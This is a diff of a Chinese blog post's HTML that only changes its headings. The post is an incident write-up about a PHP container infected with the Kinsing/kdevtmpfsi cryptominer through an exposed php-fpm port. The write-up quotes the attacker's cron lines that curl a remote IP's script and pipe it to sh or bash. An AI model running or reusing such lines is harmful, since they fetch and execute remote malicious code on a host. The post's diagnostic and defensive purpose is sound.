@@ -204,19 +204,19 @@ blockquote,
 <small><code><a href="https://kouler.com/tags/php">#php</a></code></small>
 
     <br><br>
-<h1 id="环境">环境</h1>
+<h2 id="环境">环境</h2>
 <ul>
 <li>基于 php7.4.12 的容器</li>
 <li>使用 Lumen 框架</li>
 </ul>
-<h1 id="发现异常状况">发现异常状况</h1>
+<h2 id="发现异常状况">发现异常状况</h2>
 <p>最开始察觉到异常是在错误邮件中</p>
 <p>错误信息是 <code>Cannot modify header information - headers already sent by (output started at php://input:1)</code></p>
 <p>几天后，发现页面中出现大量跨域错误</p>
 <p>查看 git 提交日志，发现最近并没有大的变动，怀疑是运维问题</p>
 <p>再次检查邮箱，发现最近几日有大量 <code>Cannot modify header information - headers already sent by (output started at php://input:1)</code> 错误，错误文件指向了跨域处理文件，错误函数为 <code>header()</code>。与错误信息吻合，应该是在这之前有输出，此时可以确认导致错误的根本原因并非跨域问题。</p>
 <p>通过测试 API，发现其中一些 POST API 在正确的响应内容前会先将 POST 请求中的请求体输出。而 GET 参数则一切正常。</p>
-<h1 id="寻找问题根源">寻找问题根源</h1>
+<h2 id="寻找问题根源">寻找问题根源</h2>
 <p>多次测试 API 后发现一些规律。</p>
 <ol>
 <li>使用 x-www-form-urlencoded 和 json 方式时，PHP 直接返回了 POST 请求 body 信息。而使用 multipart/form-data 方式时却没有返回</li>
@@ -225,7 +225,7 @@ blockquote,
 </ol>
 <p>这里基本可以确认和框架没有关系。而且引出了 <code>php://input</code> 数据流。</p>
 <p>POST 方法中的 x-www-form-urlencoded 和 raw 格式 Body 体会写入到 <code>php://input</code> 流中，与之前发现的规律相吻合。</p>
-<h1 id="发现挖矿恶意程序">发现挖矿恶意程序</h1>
+<h2 id="发现挖矿恶意程序">发现挖矿恶意程序</h2>
 <p>在查找 php:input 数据流问题时，偶然发现容器中运行着两个异常进程，名称分别是 <code>kinsing</code> 和 <code>kdevtmpfsi</code></p>
 <pre><code>root@b3f806f09ccd:~# ps -aux
 USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
@@ -236,7 +236,7 @@ www-data 15605  199 29.3 2930476 2397156 ?     Ssl  Aug04 11245:50 /tmp/kdevtmpf
 </code></pre><p>这两个进程从 8 月 4 日晚启动，与第一次错误日志出现的时间有关联。</p>
 <p>搜索后得知，这两个程序是挖矿恶意程序。使用 <code>kill -9</code> 强制杀掉后，再次测试 API，能够正常返回数据。</p>
 <p>至此可以确认一切的根源就是该挖矿恶意程序导致的。</p>
-<h1 id="无法完全禁止挖矿恶意程序启动">无法完全禁止挖矿恶意程序启动</h1>
+<h2 id="无法完全禁止挖矿恶意程序启动">无法完全禁止挖矿恶意程序启动</h2>
 <p>使用 <code>kill -9</code> 命令强制杀死挖矿进程后，发现其会在几分钟内自行重启</p>
 <p>查看 supervisor 服务，发现没有类似的配置。再查看 <code>cron</code> 服务，发现了异常计划任务。 <code>* * * * * curl http://195.3.146.118/unk.sh | sh &gt; /dev/null 2&gt;&amp;1</code></p>
 <p>删除该计划任务，几分钟后又出现了类似的计划任务。 <code>* * * * * curl http://195.3.146.118/ph.sh | bash &gt; /dev/null 2&gt;&amp;1</code></p>
@@ -261,7 +261,7 @@ root     11785  0.0  0.0   7632  1412 ?        R+   20:59   0:00 ps aux
         - [11673] bash
           - [11765] curl
 </code></pre><p>通过进程树发现恶意程序是通过 <code>php-fpm</code> 进程执行了 <code>curl</code> 命令</p>
-<h1 id="临时恢复服务">临时恢复服务</h1>
+<h2 id="临时恢复服务">临时恢复服务</h2>
 <p>搜索后发现网络上大部分是通过 redis 被注入的恶意代码。</p>
 <p>我们的容器没有装 redis，很可能是通过 php-fpm 被注入的，类似于 <a href="https://learnku.com/articles/52350">关于 linux 病毒 kinsing-kdevtmpfsi 的处理</a> 这篇文章所描述的</p>
 <p>所以最终决定借着此次事件，升级到更安全的 PHP 版本，并重新制作镜像。</p>
@@ -284,7 +284,7 @@ www-data 17650  0.0  0.3 718732 29360 ?        Sl   02:30   0:00 /tmp/kinsing_aw
 www-data 17817  200 29.3 2737844 2398144 ?     Ssl  02:31  90:35 /tmp/kdevtmpfsi593659172
 root     18553  0.0  0.0   7632  1412 ?        R+   03:16   0:00 ps aux
 </code></pre><p>不得已使用了另一种更直接的方式，每 20s 强制停止恶意程序。具体方法可以参考这篇文章 <a href="https://www.createit.com/blog/kinsing-malware-how-to-kill/">Kinsing malware (kdevtmpfsi)- how to kill</a></p>
-<h1 id="php-fpm-的漏洞逻辑">php-fpm 的漏洞逻辑</h1>
+<h2 id="php-fpm-的漏洞逻辑">php-fpm 的漏洞逻辑</h2>
 <ul>
 <li>php-fpm 用于解析 fastcgi 协议，决定了 php 将执行哪个文件</li>
 <li>当 php-fpm 端口暴露在外，就可以自己构建 fastcig 协议内容</li>
@@ -303,10 +303,10 @@ root     18553  0.0  0.0   7632  1412 ?        R+   03:16   0:00 ps aux
 <p>fpm 一般会启动多个进程，你如果用了 ADMIN_VALUE，你访问的这个进程的配置项就改变了，但不影响其他进程。如果你多访问几次，就可能把所有进程的配置项都改了，而且是永久改的。直到下次重启 fpm。</p>
 </blockquote>
 <p>详细内容可以参考这篇文章 <a href="https://www.leavesongs.com/PENETRATION/fastcgi-and-php-fpm.html">Fastcgi 协议分析 &amp;&amp; PHP-FPM 未授权访问漏洞 &amp;&amp; Exp 编写</a></p>
-<h1 id="问题解决">问题解决</h1>
+<h2 id="问题解决">问题解决</h2>
 <p>此次被攻击是由于疏忽导致，对外网暴露了 php-fpm 使用的 9000 端口。</p>
 <p>外网禁用 9000 端口并重新构建镜像部署服务后，问题得以解决。</p>
-<h1 id="了解-kinsing-恶意程序">了解 Kinsing 恶意程序</h1>
+<h2 id="了解-kinsing-恶意程序">了解 Kinsing 恶意程序</h2>
 <blockquote>
 <p>Kinsing is Golang-based malware that runs a cryptocurrency miner and attempts to spread itself to other hosts in the victim environment.</p>
 </blockquote>
@@ -315,7 +315,7 @@ root     18553  0.0  0.0   7632  1412 ?        R+   03:16   0:00 ps aux
 <li><a href="https://blog.aquasec.com/threat-alert-kinsing-malware-container-vulnerability">Kinsing Malware Attacks Targeting Container Environments</a></li>
 <li><a href="https://www.cyberark.com/resources/threat-research-blog/kinsing-the-malware-with-two-faces">Kinsing: The Malware with Two Faces</a></li>
 </ul>
-<h1 id="参考--扩展">参考 &amp; 扩展</h1>
+<h2 id="参考--扩展">参考 &amp; 扩展</h2>
 <ul>
 <li><a href="https://learnku.com/articles/52350">关于 linux 病毒 kinsing-kdevtmpfsi 的处理</a></li>
 <li><a href="https://stackoverflow.com/questions/60151640/kdevtmpfsi-using-the-entire-cpu">kdevtmpfsi-using-the-entire-cpu</a></li>
